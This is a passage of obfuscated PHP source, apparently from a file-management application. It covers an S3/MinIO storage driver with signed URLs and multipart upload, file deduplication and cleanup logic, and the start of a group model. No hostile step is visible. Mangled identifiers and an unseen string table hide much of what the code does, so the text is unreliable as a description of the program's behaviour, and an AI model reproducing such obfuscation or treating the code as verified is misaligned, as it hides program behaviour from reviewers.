$˜ş¼¤‚, $ÒŠë¸Ø— = false, $»±ÃçÉ¡ = REPEAT_REPLACE) { $º¥¿·üÓ =& $_SERVER[³·—™¤¢]; $¨ÙÚ¤ö¨ = array($º¥¿·üÓ[212] => @md5_file($˜ş¼¤‚)); $ˆó½±Ó— = array($º¥¿·üÓ[215] => get_file_mime(get_path_ext($ûªÚôà))); if (IO::size($˜ş¼¤‚) <= 1024 * 1024 * 200) { $†ÖÕ·„ = $this->client->putObjectFile($˜ş¼¤‚, $this->bucket, $ûªÚôà, $º¥¿·üÓ[198], $¨ÙÚ¤ö¨, $ˆó½±Ó—); return !empty($†ÖÕ·„) ? $this->getPathOuter($ûªÚôà) : !1; } $ò¥ıÁ›§ = $this->client->multiUploadObject($˜ş¼¤‚, $this->bucket, trim($ûªÚôà, $º¥¿·üÓ[8]), $¨ÙÚ¤ö¨, $ˆó½±Ó—); return $ò¥ıÁ›§ ? $this->getPathOuter($ûªÚôà) : !1; } public function download($¶›º€ó, $ï—‰ñå) { if (!@is_dir($this->pathFather($ï—‰ñå)) && !IO::mkdir($this->pathFather($ï—‰ñå))) { return !1; } $ğËô­Ú— = $this->client->getObject($this->bucket, $¶›º€ó, array(), $ï—‰ñå); return $ğËô­Ú— !== !1 ? $ï—‰ñå : !1; } public function link($¤ß‡Ö¥Â, $“…°ÂäŸ = array()) { $ò×öîÜğ =& $_SERVER[³·—™¤¢]; if ($this->signVer == $ò×öîÜğ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $¤ß‡Ö¥Â, 3600 * 12, $“…°ÂäŸ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¤ß‡Ö¥Â, $ò×öîÜğ[8]), 3600 * 12, $this->region, array(), !0, $“…°ÂäŸ); } public function fileOut($ÄÇ®šëº, $»êí§ÖŒ = false, $´º¡ÎÕœ = false, $†èÜÙ = '') { $ÈÜİ©ğ§ =& $_SERVER[³·—™¤¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÄÇ®šëº, $»êí§ÖŒ, $´º¡ÎÕœ, $†èÜÙ); } if (!$´º¡ÎÕœ) { $´º¡ÎÕœ = $this->pathThis($ÄÇ®šëº); } $ıŸ†¬Ÿ® = get_file_mime(get_path_ext($´º¡ÎÕœ)); if ($ıŸ†¬Ÿ® == $ÈÜİ©ğ§[217]) { return parent::fileOut($ÄÇ®šëº, $»êí§ÖŒ, $´º¡ÎÕœ, $†èÜÙ); } $Èä‹•¸Ç = array($ÈÜİ©ğ§[218] => $ıŸ†¬Ÿ®); if ($»êí§ÖŒ) { $Èä‹•¸Ç[$ÈÜİ©ğ§[219]] = $ÈÜİ©ğ§[220] . rawurlencode($´º¡ÎÕœ); } else { } $Ç—ùÉ›í = $this->link($ÄÇ®šëº, $Èä‹•¸Ç); $this->fileOutLink($Ç—ùÉ›í); } public function fileOutServer($¡ç“â˜, $ÕÙ¨ ‰¯ = false, $õó²Ç¦ = false, $®›âôİ = '') { parent::fileOut($¡ç“â˜, $ÕÙ¨ ‰¯, $õó²Ç¦, $®›âôİ); } public function fileOutImageServer($öÁÒ–µ, $±¦¿ƒÉı = 250) { parent::fileOutImage($öÁÒ–µ, $±¦¿ƒÉı); } public function hashMd5($ƒŠË˜¶, $Òçªò = '') { $Úô¸Ë–¦ =& $_SERVER[³·—™¤¢]; $Öî´£Ã° = $this->objectMeta($ƒŠË˜¶); if (!$Öî´£Ã°) { return !1; } $Òçªò = $Òçªò ? $Òçªò : _get($Öî´£Ã°, $Úô¸Ë–¦[221]); $Òçªò = $Òçªò ? $Òçªò : _get($Öî´£Ã°, $Úô¸Ë–¦[213], $Úô¸Ë–¦[12]); return $Òçªò; } public function uploadFormData($ÆÁ•ƒÊˆ, $ûùê”úø = 3600) { $õŒìø =& $_SERVER[³·—™¤¢]; $…Ÿ›¾ñ = $this->pathFather($ÆÁ•ƒÊˆ); $ô‰èºü = $this->client->getHttpUploadPostParams($this->bucket, $…Ÿ›¾ñ, $õŒìø[198], $ûùê”úø); return array_merge((array) $ô‰èºü, array($õŒìø[181] => $this->getHost())); } public function multiUploadFormData($¸ºş¸»ü, $¼´£¤½û = 3600) { $Ü…ªŒĞó =& $_SERVER[³·—™¤¢]; $‹´¶ˆß = gmdate($Ü…ªŒĞó[222]); $Å¿Å”  = array(); $ÎÍÁ‘Ì‹ = $this->client->getUploadId($this->bucket, $¸ºş¸»ü, $Å¿Å” ); if (!$ÎÍÁ‘Ì‹) { return !1; } return array($Ü…ªŒĞó[223] => $ÎÍÁ‘Ì‹, $Ü…ªŒĞó[181] => $this->getHost() . $Ü…ªŒĞó[8] . $this->pathEncode($¸ºş¸»ü), $Ü…ªŒĞó[224] => $‹´¶ˆß, $Ü…ªŒĞó[94] => $¸ºş¸»ü); } public function multiUploadAuthData($õ†¼Ş”ô, $ÑøÄä® = array()) { $¶¾ÍŸìÏ =& $_SERVER[³·—™¤¢]; $»¦ôŞÍè = isset($ÑøÄä®[$¶¾ÍŸìÏ[224]]) ? $ÑøÄä®[$¶¾ÍŸìÏ[224]] : gmdate($¶¾ÍŸìÏ[222]); $©øÏô”¦ = isset($ÑøÄä®[$¶¾ÍŸìÏ[174]]) ? $ÑøÄä®[$¶¾ÍŸìÏ[174]] : $¶¾ÍŸìÏ[12]; $ï ™€Ç = $ÑøÄä®[$¶¾ÍŸìÏ[94]]; unset($ÑøÄä®[$¶¾ÍŸìÏ[94]]); if (isset($ÑøÄä®[$¶¾ÍŸìÏ[225]])) { $ÑøÄä®[$¶¾ÍŸìÏ[224]] = $»¦ôŞÍè; return $this->listUploadParts($ï ™€Ç, $ÑøÄä®); } $Ÿú¸è¼ï = array($¶¾ÍŸìÏ[226], $¶¾ÍŸìÏ[12], $¶¾ÍŸìÏ[120], $¶¾ÍŸìÏ[12], "\170\55\141\155\x7a\x2d\144\141\164\x65\x3a{$»¦ôŞÍè}", $¶¾ÍŸìÏ[8] . $this->bucket . $¶¾ÍŸìÏ[8] . $this->pathEncode($ï ™€Ç) . $©øÏô”¦); if (strpos($©øÏô”¦, $¶¾ÍŸìÏ[227]) === 0) { $Ÿú¸è¼ï[0] = $¶¾ÍŸìÏ[228]; } if (isset($ÑøÄä®[$¶¾ÍŸìÏ[229]]) && $ÑøÄä®[$¶¾ÍŸìÏ[229]] == $¶¾ÍŸìÏ[230]) { $Ÿú¸è¼ï[0] = $¶¾ÍŸìÏ[230]; } $Ø®—’ = implode($¶¾ÍŸìÏ[231], $Ÿú¸è¼ï); $­¸Í˜„ë = base64_encode(hash_hmac($¶¾ÍŸìÏ[232], $Ø®—’, $this->secret, !0)); $©‘‘°œö = $¶¾ÍŸìÏ[233] . $this->accessKey . $¶¾ÍŸìÏ[4] . $­¸Í˜„ë; if (strpos($©øÏô”¦, $¶¾ÍŸìÏ[227]) === 0) { return array($¶¾ÍŸìÏ[234] => $©‘‘°œö, $¶¾ÍŸìÏ[224] => $»¦ôŞÍè); } return $©‘‘°œö; } public function listUploadParts($Úâ©¿Î, $º²Ü¹·Í = array()) { $¦š©¼¯ª =& $_SERVER[³·—™¤¢]; $óÃŸÂ™Ğ = str_replace($¦š©¼¯ª[235], $¦š©¼¯ª[12], $º²Ü¹·Í[$¦š©¼¯ª[174]]); $Ş‰©¯Ì  = $this->client->listParts($this->bucket, $Úâ©¿Î, $óÃŸÂ™Ğ); if (!$Ş‰©¯Ì ) { return !1; } unset($º²Ü¹·Í[$¦š©¼¯ª[225]], $º²Ü¹·Í[$¦š©¼¯ª[229]]); $º²Ü¹·Í[$¦š©¼¯ª[94]] = $Úâ©¿Î; $íâŸ›‘§ = $this->multiUploadAuthData($Úâ©¿Î, $º²Ü¹·Í); if (empty($íâŸ›‘§)) { return !1; } return array($¦š©¼¯ª[234] => $íâŸ›‘§, $¦š©¼¯ª[224] => $º²Ü¹·Í[$¦š©¼¯ª[224]], $¦š©¼¯ª[236] => $Ş‰©¯Ì ); } public function getHost() { return parent::getHost() . $_SERVER[³·—™¤¢][8] . $this->bucket; } public function size($š„ËÑ°ä) { $Ì€ÊÒ’Ô = $this->objectMeta($š„ËÑ°ä); return $Ì€ÊÒ’Ô ? $Ì€ÊÒ’Ô[$_SERVER[³·—™¤¢][76]] : 0; } public function info($œ¦’¼³Â) { if ($this->isFolder($œ¦’¼³Â)) { return $this->folderInfo($œ¦’¼³Â); } else { if ($this->isFile($œ¦’¼³Â)) { return $this->fileInfo($œ¦’¼³Â); } } return !1; } public function exist($ª¹ÊÅ·ü) { return $this->isFile($ª¹ÊÅ·ü) || $this->isFolder($ª¹ÊÅ·ü); } public function isFile($ôÉ”ô§ª) { return !$this->isFolder($ôÉ”ô§ª) && $this->objectMeta($ôÉ”ô§ª); } public function isFolder($ÅÃ×–óÑ) { return $this->cacheMethod($_SERVER[³·—™¤¢][165], $ÅÃ×–óÑ); } protected function objectMeta($™¯¥ÛÕó) { return $this->cacheMethod($_SERVER[³·—™¤¢][167], $™¯¥ÛÕó); } protected function _objectMeta($™Å›âà–) { $ä—°îæÆ =& $_SERVER[³·—™¤¢]; $™Å›âà– = rtrim($™Å›âà–, $ä—°îæÆ[8]); try { $˜“Ãš ² = $this->client->getObjectInfo($this->bucket, $™Å›âà–); if (!isset($˜“Ãš ²[$ä—°îæÆ[221]]) && isset($˜“Ãš ²[$ä—°îæÆ[237]])) { $˜“Ãš ²[$ä—°îæÆ[221]] = $˜“Ãš ²[$ä—°îæÆ[237]]; } } catch (Exception $²©áüÄö) { $˜“Ãš ² = !1; } if (!$˜“Ãš ²) { } return $˜“Ãš ²; } protected function _isFolder($“–©‹ß) { $‘Ší¦ÙÌ =& $_SERVER[³·—™¤¢]; $“–©‹ß = rtrim($“–©‹ß, $‘Ší¦ÙÌ[8]); if ($“–©‹ß == $‘Ší¦ÙÌ[12] || $“–©‹ß == $‘Ší¦ÙÌ[8]) { return !0; } $‡í³¡Şµ = $this->client->getBucket($this->bucket, $“–©‹ß, null, 1); if (empty($‡í³¡Şµ[$‘Ší¦ÙÌ[204]])) { return !1; } $€õ½Ã¿Î = $‡í³¡Şµ[$‘Ší¦ÙÌ[204]][0][$‘Ší¦ÙÌ[32]]; return stripos($€õ½Ã¿Î, $“–©‹ß . $‘Ší¦ÙÌ[8]) === 0 ? !0 : !1; if (substr($€õ½Ã¿Î, -1) == $‘Ší¦ÙÌ[8]) { return !0; } if (get_path_this($€õ½Ã¿Î) == get_path_this($“–©‹ß)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ìÁ¾åãº) { parent::__construct($ìÁ¾åãº); $this->signatureVersion($_SERVER[³·—™¤¢][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto A£¬Õ¤õ; B¸×‡…èÂÖ: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\x65\137\x63\x6f\156\164\145\156\x74\163"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\x54\151\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\x72\164", "\x66\x75\x6e\x63\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\x6c\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\145" => "\151\157\137\146\151\154\x65\137\155\145\x74\x61", "\x6d\145\164\141\x46\x69\x65\154\x64" => "\146\x69\154\145\111\x44"); public function fileInfo($Ç‡çíù) { $¡ÙÂ’õ¢ =& $_SERVER[³·—™¤¢]; static $‚²¬ß÷ù = array(); if (!isset($‚²¬ß÷ù[$Ç‡çíù])) { $†ïÂª§ = $¡ÙÂ’õ¢[1901]; $ÕñØ¿€Ä = Model($¡ÙÂ’õ¢[471])->field($†ïÂª§)->where(array($¡ÙÂ’õ¢[469] => $Ç‡çíù))->find(); $‚²¬ß÷ù[$Ç‡çíù] = $ÕñØ¿€Ä; } return $‚²¬ß÷ù[$Ç‡çíù]; } public function addFileByContent($©ì§¤‘Ù = '', $­àµâ£Ê = '') { $ŸÉÑÎü° =& $_SERVER[³·—™¤¢]; $‰Œı©­ = TEMP_PATH . $ŸÉÑÎü°[1902]; if (!is_dir($‰Œı©­)) { mk_dir($‰Œı©­); } $Œ«™Ã–Á = $‰Œı©­ . $ŸÉÑÎü°[1903] . rand_string(16); file_put_contents($Œ«™Ã–Á, $©ì§¤‘Ù); $Ûª£è´ù = $this->addFile($Œ«™Ã–Á, $­àµâ£Ê, !0); if (file_exists($Œ«™Ã–Á)) { @unlink($Œ«™Ã–Á); } return $Ûª£è´ù; } public function createFileName($§²Á°ÇÒ, $Çäõšî = false, $‚ÀÑ¹ÈÏ = false) { $»ûË¸Áü =& $_SERVER[³·—™¤¢]; $ôâ”„È¾ = IO::init($»ûË¸Áü[8]); $Ü›Á€“Ğ = $this->makeFilePath($§²Á°ÇÒ, $ôâ”„È¾, $Çäõšî, $‚ÀÑ¹ÈÏ); $åèŞÂÇ¼ = $ôâ”„È¾->pathFather($Ü›Á€“Ğ); static $÷ÈŞéŒé = false; $¬á´×é½ = $»ûË¸Áü[1904] . md5($åèŞÂÇ¼); if (!$÷ÈŞéŒé && !Cache::get($¬á´×é½)) { $÷ÈŞéŒé = !0; $¹úÖšÃ™ = IO::mkdir($åèŞÂÇ¼); if (!IO::exist($¹úÖšÃ™ . $»ûË¸Áü[817])) { IO::mkfile($¹úÖšÃ™ . $»ûË¸Áü[817]); } Cache::set($¬á´×é½, 1, 3600 * 2); } return $Ü›Á€“Ğ; } public function makeFilePath($ªŸïÂ”ü, $ƒ…ÕÇ­ğ, $ñâ±–Úş = false, $ ¶åÜò• = false) { $Ï¼‹›¡Ø =& $_SERVER[³·—™¤¢]; $Â×Ÿ¤öá = Model($Ï¼‹›¡Ø[790])->get($Ï¼‹›¡Ø[1905]); $ìÈåÒ…¹ = KodIO::defaultIO() . date($Ï¼‹›¡Ø[1906]); $§¹şãë = $ìÈåÒ…¹ . rand_string(5) . short_id(100); $ªŸïÂ”ü = str_replace($Ï¼‹›¡Ø[8], $Ï¼‹›¡Ø[11], KodIO::clear($ªŸïÂ”ü)); $´¥óŞ¿· = $ƒ…ÕÇ­ğ->ext($ªŸïÂ”ü); if (!$ªŸïÂ”ü) { $Â×Ÿ¤öá = $Ï¼‹›¡Ø[1907]; } switch ($Â×Ÿ¤öá) { case $Ï¼‹›¡Ø[1908]: $§¹şãë = $§¹şãë . $Ï¼‹›¡Ø[10] . $ƒ…ÕÇ­ğ->ext($ªŸïÂ”ü); if ($´¥óŞ¿· == $Ï¼‹›¡Ø[1845]) { $§¹şãë .= $Ï¼‹›¡Ø[1573]; } break; case $Ï¼‹›¡Ø[1909]: $¦ì—ƒ¦³ = Model($Ï¼‹›¡Ø[790])->get($Ï¼‹›¡Ø[791]); $²õÈÉ”û = substr(md5($Ï¼‹›¡Ø[792] . $¦ì—ƒ¦³ . date($Ï¼‹›¡Ø[768])), 0, 8); $ûÈş‰Ş = KodIO::defaultDriver(); $ìÈåÒ…¹ = $Ï¼‹›¡Ø[1252] . $ûÈş‰Ş[$Ï¼‹›¡Ø[399]] . $Ï¼‹›¡Ø[409] . date($Ï¼‹›¡Ø[1910]) . $²õÈÉ”û . $Ï¼‹›¡Ø[8]; if ($´¥óŞ¿· == $Ï¼‹›¡Ø[1845]) { $ªŸïÂ”ü .= $Ï¼‹›¡Ø[1573]; } $ş²ƒÂû¾ = $Ï¼‹›¡Ø[1911] . $ìÈåÒ…¹ . $ªŸïÂ”ü; CacheLock::lock($ş²ƒÂû¾); $§¹şãë = $ìÈåÒ…¹ . $ªŸïÂ”ü; if (IO::exist($ìÈåÒ…¹ . $ªŸïÂ”ü)) { $…»½¥Ä = substr($ªŸïÂ”ü, 0, strlen($ªŸïÂ”ü) - strlen($´¥óŞ¿·)); $Ç¦‰é‘‹ = $ ¶åÜò• ? substr($ ¶åÜò•, 0, 5) : ($ñâ±–Úş ? substr($ñâ±–Úş, 0, 5) : rand_string(5)); $§¹şãë = $ìÈåÒ…¹ . $…»½¥Ä . $Ç¦‰é‘‹ . $Ï¼‹›¡Ø[10] . $´¥óŞ¿·; } if (IO::isTypeObject($§¹şãë) && !IO::isUploadServer($§¹şãë)) { if (IO::exist($§¹şãë)) { return $§¹şãë; } $ØÆÍê‚Ì = IO::setContent($§¹şãë, $Ï¼‹›¡Ø[12]); if (!$ØÆÍê‚Ì) { show_json($Ï¼‹›¡Ø[1912], !1); } } CacheLock::unlock($ş²ƒÂû¾); break; case $Ï¼‹›¡Ø[1907]: break; default: break; } return $§¹şãë; } public function addFileByRemote($šÒÉ®İ›, $Î°Ùƒ—, $ª™ºÎ˜ı = array()) { $¾Ä¾€‘Â =& $_SERVER[³·—™¤¢]; if (!IO::exist($šÒÉ®İ›)) { return !1; } $Òßµšğ÷ = $ª™ºÎ˜ı[$¾Ä¾€‘Â[176]] ? $ª™ºÎ˜ı[$¾Ä¾€‘Â[176]] : $¾Ä¾€‘Â[12]; $áÎ‰Ïğˆ = IO::hashMd5($šÒÉ®İ›, $Òßµšğ÷); $®‘Õ©ü’ = KodIO::defaultDriver(); $«Ë¡ÖÕú = array($¾Ä¾€‘Â[585] => IO::size($šÒÉ®İ›), $¾Ä¾€‘Â[1913] => 1, $¾Ä¾€‘Â[420] => $Î°Ùƒ—, $¾Ä¾€‘Â[828] => $®‘Õ©ü’[$¾Ä¾€‘Â[399]], $¾Ä¾€‘Â[421] => $šÒÉ®İ›, $¾Ä¾€‘Â[1914] => $ª™ºÎ˜ı[$¾Ä¾€‘Â[177]] ? $ª™ºÎ˜ı[$¾Ä¾€‘Â[177]] : IO::hashSimple($šÒÉ®İ›), $¾Ä¾€‘Â[1915] => $áÎ‰Ïğˆ ? $áÎ‰Ïğˆ : $Òßµšğ÷); if ($ëÕ¥¯–ø = $this->addFileCheckExist($«Ë¡ÖÕú[$¾Ä¾€‘Â[177]], $«Ë¡ÖÕú[$¾Ä¾€‘Â[176]], $«Ë¡ÖÕú[$¾Ä¾€‘Â[76]])) { return $ëÕ¥¯–ø; } return $this->addFileData($«Ë¡ÖÕú); } private function addFileData($œ—Ïóı) { $ßøŸıº =& $_SERVER[³·—™¤¢]; if (!$œ—Ïóı) { return !1; } $œ—Ïóı[$ßøŸıº[76]] = intval($œ—Ïóı[$ßøŸıº[76]]); if (!$œ—Ïóı[$ßøŸıº[76]] && strlen($œ—Ïóı[$ßøŸıº[177]]) > 32) { $œ—Ïóı[$ßøŸıº[76]] = intval(substr($œ—Ïóı[$ßøŸıº[177]], 32)); } $Ã¡Â‘˜ = $this->add($œ—Ïóı); return $this->find($Ã¡Â‘˜); } public function addFile($ÈìÔ¯¥, $ÉÕïæíÖ, $¨ª×ª£Ÿ = false) { $ËĞÕ¼™² =& $_SERVER[³·—™¤¢]; $îÌ«ŞÕ³ = IO::hashSimple($ÈìÔ¯¥); $Âí˜Ü‹Ò = IO::size($ÈìÔ¯¥); $šûŒ§„ = $Âí˜Ü‹Ò <= 1024 * 1024 * 10 ? IO::hashMd5($ÈìÔ¯¥) : $ËĞÕ¼™²[12]; $ê¼×´Ùä = $ËĞÕ¼™²[1916] . $îÌ«ŞÕ³; CacheLock::lock($ê¼×´Ùä); if ($šûŒ§„ && $îÌ«ŞÕ³) { $”Âø„ï˜ = $this->addFileCheckExist($îÌ«ŞÕ³, $šûŒ§„, $Âí˜Ü‹Ò); if ($”Âø„ï˜) { CacheLock::unlock($ê¼×´Ùä); return $”Âø„ï˜; } } $ÌÏØŸ—“ = $this->addFileMake($ÈìÔ¯¥, $Âí˜Ü‹Ò, $îÌ«ŞÕ³, $šûŒ§„, $ÉÕïæíÖ, $¨ª×ª£Ÿ); $”â ½î© = $this->addFileData($ÌÏØŸ—“); CacheLock::unlock($ê¼×´Ùä); if (!$šûŒ§„ && $”â ½î©) { $this->fileMd5Check($”â ½î©); } return $”â ½î©; } private function fileMd5Check($ˆãÏÏ) { $‹¨ı“¾§ =& $_SERVER[³·—™¤¢]; $×­‘ÍÖ = array($ˆãÏÏ[$‹¨ı“¾§[468]], $ˆãÏÏ[$‹¨ı“¾§[84]]); $·…‡¸†ô = $‹¨ı“¾§[1917] . $ˆãÏÏ[$‹¨ı“¾§[84]]; $ØĞ…‘âü = $‹¨ı“¾§[1918] . $ˆãÏÏ[$‹¨ı“¾§[468]]; $ŞŒ¨Şµ´ = TaskQueue::add($‹¨ı“¾§[1919], $×­‘ÍÖ, $·…‡¸†ô, $ØĞ…‘âü); if (!$ŞŒ¨Şµ´) { $this->fileMd5Set($ˆãÏÏ[$‹¨ı“¾§[468]], $ˆãÏÏ[$‹¨ı“¾§[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($áô®ŒİØ, $—¤öá½) { $ŒØ¾¾«ä =& $_SERVER[³·—™¤¢]; $ÁÊ±÷´˜ = $this->find($áô®ŒİØ); if (!$ÁÊ±÷´˜ || $ÁÊ±÷´˜[$ŒØ¾¾«ä[176]]) { return; } $šıÉÜÔ› = IO::hashMd5($—¤öá½); if (!$šıÉÜÔ›) { return $ŒØ¾¾«ä[12]; } $this->where(array($ŒØ¾¾«ä[468] => $áô®ŒİØ))->save(array($ŒØ¾¾«ä[176] => $šıÉÜÔ›)); } public function addFileMake($ÃÎ¹¨¹, $¶üöŒÈŸ, $ªÀÄŠÄ, $ú›­‰—×, $Ó´®´Õê, $Ü¯Ú‡ÇË) { $Şªø‰™® =& $_SERVER[³·—™¤¢]; $ÄÆéöˆÙ = $this->createFileName($Ó´®´Õê, $ªÀÄŠÄ, $ú›­‰—×); $¢¡Èîú• = get_path_father($ÄÆéöˆÙ); $ğµ®¬åÏ = get_path_this($ÄÆéöˆÙ); if ($Ü¯Ú‡ÇË) { $¹ØİÉã = IO::move($ÃÎ¹¨¹, $¢¡Èîú•, !1, $ğµ®¬åÏ); } else { $¹ØİÉã = IO::copy($ÃÎ¹¨¹, $¢¡Èîú•, !1, $ğµ®¬åÏ); } if (!$¹ØİÉã) { return !1; } $•±ÒÏ’ = KodIO::defaultDriver(); $‚“×¬©­ = array($Şªø‰™®[585] => $¶üöŒÈŸ, $Şªø‰™®[1913] => 1, $Şªø‰™®[420] => $Ó´®´Õê, $Şªø‰™®[828] => $•±ÒÏ’[$Şªø‰™®[399]], $Şªø‰™®[421] => $ÄÆéöˆÙ, $Şªø‰™®[1914] => $ªÀÄŠÄ, $Şªø‰™®[1915] => $ú›­‰—×); return $‚“×¬©­; } public function addFileCheckExist($¡ÃÇ÷Ä, $êÕå³, $¤ßëüñ¾) { $ıŠøøÄî =& $_SERVER[³·—™¤¢]; $×öÃº‘ß = $this->findByHash($¡ÃÇ÷Ä, $êÕå³); if (!$×öÃº‘ß) { return !1; } $¯íÁğù = array($ıŠøøÄî[1913] => intval($×öÃº‘ß[$ıŠøøÄî[1920]]) + 1, $ıŠøøÄî[585] => $¤ßëüñ¾); $this->where(array($ıŠøøÄî[469] => $×öÃº‘ß[$ıŠøøÄî[468]]))->save($¯íÁğù); return $×öÃº‘ß; } public function remove($«ğóÙ¦Ä) { $this->linkCountChange($«ğóÙ¦Ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ê»¢©«’) { $this->linkCountChange($Ê»¢©«’, !0); } public function linkCountChange($Ç®†Î¥…, $¨ÛË¨íÉ) { $Ç›¸¼¾ =& $_SERVER[³·—™¤¢]; if (!$Ç®†Î¥…) { return; } if (!is_array($Ç®†Î¥…)) { $Ç®†Î¥… = array($Ç®†Î¥…); } $™ÌÀÂÚ± = array(); foreach ($Ç®†Î¥… as $ıœÕã) { $ğ­Á³À‡ = $ıœÕã . $Ç›¸¼¾[12]; if (!$™ÌÀÂÚ±[$ğ­Á³À‡]) { $™ÌÀÂÚ±[$ğ­Á³À‡] = 0; } $™ÌÀÂÚ±[$ğ­Á³À‡]++; } $…¥†ÄéØ = array(); foreach ($™ÌÀÂÚ± as $ıœÕã => $ªë«¤³î) { $ğ­Á³À‡ = $ªë«¤³î . $Ç›¸¼¾[12]; if (!$…¥†ÄéØ[$ğ­Á³À‡]) { $…¥†ÄéØ[$ğ­Á³À‡] = array(); } $…¥†ÄéØ[$ğ­Á³À‡][] = $ıœÕã; } foreach ($…¥†ÄéØ as $ªë«¤³î => $“¼òı¿¥) { if (!$“¼òı¿¥) { continue; } $ªë«¤³î = $¨ÛË¨íÉ ? $ªë«¤³î : -intval($ªë«¤³î); $¸“¶Ã û = array($Ç›¸¼¾[468] => array($Ç›¸¼¾[7], $“¼òı¿¥)); if ($ªë«¤³î < 0) { $¸“¶Ã û[$Ç›¸¼¾[1920]] = array($Ç›¸¼¾[1038], abs($ªë«¤³î)); } $this->where($¸“¶Ã û)->setAdd($Ç›¸¼¾[1920], $ªë«¤³î); } } public function findByHash($„ÅÅÅ¦, $”‰ê•µ¬ = false) { $­ñ¤¶‘¾ =& $_SERVER[³·—™¤¢]; if (!$„ÅÅÅ¦ && !$”‰ê•µ¬) { return !1; } $ïÂÛ•şò = array($­ñ¤¶‘¾[1914] => $„ÅÅÅ¦); if ($”‰ê•µ¬) { $ïÂÛ•şò = array($­ñ¤¶‘¾[1915] => $”‰ê•µ¬); } return $this->order($­ñ¤¶‘¾[1921])->where($ïÂÛ•şò)->find(); } public function clearEmpty($×ÑŸ°Ëº = 0) { $Å÷÷Ğºœ =& $_SERVER[³·—™¤¢]; $µÍ™Ô = time() - 3600 * 24 * $×ÑŸ°Ëº; $Õ€Ó¦åö = $Å÷÷Ğºœ[1922] . $µÍ™Ô; $õƒ—ÒŞ = $this->where($Õ€Ó¦åö)->select(); if (!$õƒ—ÒŞ) { return; } $ƒØ£ì€ = new Task($Å÷÷Ğºœ[1923], $Å÷÷Ğºœ[12], count($õƒ—ÒŞ)); foreach ($õƒ—ÒŞ as $­îÎìË) { $ƒØ£ì€->update(1); $this->resetFile($­îÎìË); } $ƒØ£ì€->end(); } public function resetFile($‡ñŠ¹äâ) { $†ú£éÁ§ =& $_SERVER[³·—™¤¢]; $ÍÎ­˜±Ì = array($†ú£éÁ§[469] => $‡ñŠ¹äâ[$†ú£éÁ§[468]]); $¨¦—ÅÂ = Model($†ú£éÁ§[1350])->where($ÍÎ­˜±Ì)->count(); $¯åÛÌàĞ = Model($†ú£éÁ§[1924])->where($ÍÎ­˜±Ì)->count(); $çŞõ·“Ã = intval($¨¦—ÅÂ) + intval($¯åÛÌàĞ); if ($çŞõ·“Ã == 0) { IO::remove($‡ñŠ¹äâ[$†ú£éÁ§[84]]); Model($†ú£éÁ§[1925])->delete($‡ñŠ¹äâ[$†ú£éÁ§[468]]); $this->where($ÍÎ­˜±Ì)->delete(); $this->metaSet($‡ñŠ¹äâ[$†ú£éÁ§[468]], null, null); return; } if ($‡ñŠ¹äâ[$†ú£éÁ§[1920]] != $çŞõ·“Ã) { $this->where($ÍÎ­˜±Ì)->save(array($†ú£éÁ§[1913] => $çŞõ·“Ã)); } } public function storageInfo($Û¼æç×¤ = false) { $Ÿ‡œï¶ç =& $_SERVER[³·—™¤¢]; $ÚšÃƒ² = $this->count() + 0.0; $…çáº»¦ = 0; $ç‰¸·˜¶ = 1; $Ê©ü§œ˜ = 0; $³’î†æ = 5000; for ($÷ÛÅ“ª¿ = 0; $÷ÛÅ“ª¿ < $ÚšÃƒ²; $÷ÛÅ“ª¿ = $÷ÛÅ“ª¿ + $³’î†æ) { $›ÓıŒò = $this->limit($÷ÛÅ“ª¿, $÷ÛÅ“ª¿ + $³’î†æ)->select(); foreach ($›ÓıŒò as $ØÇÃŠê) { $ç‰¸·˜¶ += $ØÇÃŠê[$Ÿ‡œï¶ç[76]] * $ØÇÃŠê[$Ÿ‡œï¶ç[1920]]; $…çáº»¦ += $ØÇÃŠê[$Ÿ‡œï¶ç[76]] * ($ØÇÃŠê[$Ÿ‡œï¶ç[1920]] - 1); $Ê©ü§œ˜ += $ØÇÃŠê[$Ÿ‡œï¶ç[1920]]; } } $Û àßøî = array($Ÿ‡œï¶ç[1926] => $ç‰¸·˜¶, $Ÿ‡œï¶ç[1927] => $…çáº»¦, $Ÿ‡œï¶ç[1928] => $…çáº»¦ / $ç‰¸·˜¶, $Ÿ‡œï¶ç[80] => $ÚšÃƒ², $Ÿ‡œï¶ç[1929] => $Ê©ü§œ˜); return $Û àßøî; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\x6d\145" => "\x67\162\x6f\165\160\137\x6d\x65\164\x61", "\x6d\x65\164\141\x46\151\x65\154\x64" => "\x67\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($§æëíÁ€) { $‡€ÜÀùé =& $_SERVER[³·—™¤¢]; return array($‡€ÜÀùé[1930] => array($§æëíÁ€[0], $‡€ÜÀùé[1931]), $‡€ÜÀùé[1932] => array($§æëíÁ€[0], $‡€ÜÀùé[1933])); } protected function getInfo($ñò½µúĞ, $¦³¥ş£‚ = false) { $ªĞ¬¬â¬ = $this->getInfoSimple($ñò½µúĞ); if (!$ªĞ¬¬â¬) { return !1; } if ($¦³¥ş£‚) { return $this->_listDataApplyItem($ªĞ¬¬â¬); } return $this->cacheFunctionGet($_SERVER[³·—™¤¢][1934], $ñò½µúĞ); } protected function getInfoSimple($½ø¼÷·ç, $¥úİ¬ñ = false) { $ïîÃÍô¡ =& $_SERVER[³·—™¤¢]; if ($¥úİ¬ñ) { $¿ö¢Ğ–è = array($ïîÃÍô¡[1852] => intval($½ø¼÷·ç)); $“ÆæĞïğ = $this->where($¿ö¢Ğ–è)->find(); return is_array($“ÆæĞïğ) ? $“ÆæĞïğ : array(); } return $this->cacheFunctionGet($ïîÃÍô¡[1935], $½ø¼÷·ç); } protected function groupAdd($¿ïºÚÎ‹) { 